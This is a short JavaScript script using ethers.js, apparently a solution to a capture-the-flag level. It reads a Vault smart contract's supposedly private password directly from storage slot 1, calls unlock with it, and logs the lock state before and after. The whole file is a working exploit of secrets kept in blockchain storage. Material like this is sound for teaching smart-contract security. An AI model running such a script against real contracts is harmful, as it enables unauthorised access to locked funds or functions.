(async () => {
    const account = await ethers.getSigner();
    const contract = await ethers.getContractAt("Vault", process.env.INSTANCE, account);
    password = await ethers.provider.getStorageAt(contract.address, 1);

    isLocked = Boolean(Number(await ethers.provider.getStorageAt(contract.address, 0)))
    log(`[Before] isLocked : ${isLocked}`);

    tx = await contract.unlock(password);
    await tx.wait();
    
    isLocked = Boolean(Number(await ethers.provider.getStorageAt(contract.address, 0)))
    log(`{After] isLocked : ${isLocked}`);
})()